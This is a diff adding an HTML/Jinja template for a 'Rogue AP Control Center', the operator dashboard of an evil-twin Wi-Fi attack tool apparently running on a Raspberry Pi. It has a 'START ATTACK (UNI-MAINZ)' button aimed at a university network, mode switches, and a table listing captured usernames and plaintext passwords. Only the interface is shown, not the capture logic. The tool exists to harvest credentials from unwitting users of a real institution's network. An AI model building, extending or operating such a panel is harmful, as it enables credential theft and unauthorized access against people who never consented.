@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Rogue AP Control Center</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #1a1a1a;
+            color: #e0e0e0;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .container {
+            max_width: 800px;
+            margin: 0 auto;
+        }
+
+        h1 {
+            color: #ff3b30;
+            text-align: center;
+        }
+
+        .card {
+            background: #2d2d2d;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        }
+
+        .status {
+            font-size: 1.2em;
+            font-weight: bold;
+            text-align: center;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+
+        .status.ATTACK_MODE {
+            background: #ff3b30;
+            color: white;
+        }
+
+        .status.MANAGEMENT_MODE {
+            background: #34c759;
+            color: white;
+        }
+
+        .status.CLIENT_MODE {
+            background: #007aff;
+            color: white;
+        }
+
+        .status.UNKNOWN {
+            background: #8e8e93;
+            color: white;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            margin: 5px 0;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1em;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+
+        button:hover {
+            opacity: 0.8;
+        }
+
+        .btn-attack {
+            background: #ff3b30;
+            color: white;
+        }
+
+        .btn-stop {
+            background: #ff9500;
+            color: white;
+        }
+
+        .btn-mgmt {
+            background: #34c759;
+            color: white;
+        }
+
+        .btn-client {
+            background: #007aff;
+            color: white;
+        }
+
+        .btn-danger {
+            background: #5856d6;
+            color: white;
+        }
+
+        .btn-clear {
+            background: #8e8e93;
+            color: white;
+            font-size: 0.9em;
+            padding: 10px;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 10px;
+        }
+
+        th,
+        td {
+            padding: 10px;
+            text-align: left;
+            border-bottom: 1px solid #444;
+        }
+
+        th {
+            color: #888;
+        }
+
+        .cred-pass {
+            font-family: monospace;
+            color: #ff3b30;
+        }
+
+        .refresh {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .refresh a {
+            color: #007aff;
+            text-decoration: none;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>Rogue Command Center</h1>
+
+        <div class="status {{ status }}">
+            CURRENT STATUS: {{ status }}
+        </div>
+
+        <div class="refresh">
+            <a href="/">↻ Refresh Status</a>
+        </div>
+
+        <div class="card">
+            <h2>Controls</h2>
+            <form action="/action" method="POST">
+                {% if status != 'ATTACK_MODE' %}
+                <button type="submit" name="action" value="start_attack" class="btn-attack">☠️ START ATTACK
+                    (UNI-MAINZ)</button>
+                {% else %}
+                <button type="submit" name="action" value="stop_attack" class="btn-stop">🛑 STOP ATTACK (Switch to
+                    PI-ZERO)</button>
+                {% endif %}
+
+                {% if status != 'MANAGEMENT_MODE' %}
+                <button type="submit" name="action" value="management_mode" class="btn-mgmt">📡 Switch to Management AP
+                    (PI-ZERO)</button>
+                {% endif %}
+
+                {% if status != 'CLIENT_MODE' %}
+                <button type="submit" name="action" value="client_mode" class="btn-client">🌐 Switch to Internet (Client
+                    Mode)</button>
+                {% endif %}
+
+                <hr style="border-color: #444; margin: 20px 0;">
+
+                <button type="submit" name="action" value="reboot" class="btn-danger">🔄 Reboot System</button>
+                <button type="submit" name="action" value="shutdown" class="btn-danger">⚡ Shutdown</button>
+            </form>
+        </div>
+
+        <div class="card">
+            <div style="display: flex; justify-content: space-between; align-items: center;">
+                <h2>Captured Credentials ({{ creds|length }})</h2>
+                <form action="/action" method="POST" style="margin: 0;">
+                    <button type="submit" name="action" value="clear_creds" class="btn-clear">Clear</button>
+                </form>
+            </div>
+
+            <div style="overflow-x: auto;">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Time</th>
+                            <th>User</th>
+                            <th>Password</th>
+                            <th>Type</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        {% for cred in creds %}
+                        <tr>
+                            <td>{{ cred.timestamp.split(' ')[1] }}</td>
+                            <td>{{ cred.UserName or cred.username or '-' }}</td>
+                            <td class="cred-pass">{{ cred.Password or cred.password or '-' }}</td>
+                            <td>{{ cred.type or 'Login' }}</td>
+                        </tr>
+                        {% else %}
+                        <tr>
+                            <td colspan="4" style="text-align: center; color: #888;">No credentials captured yet</td>
+                        </tr>
+                        {% endfor %}
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
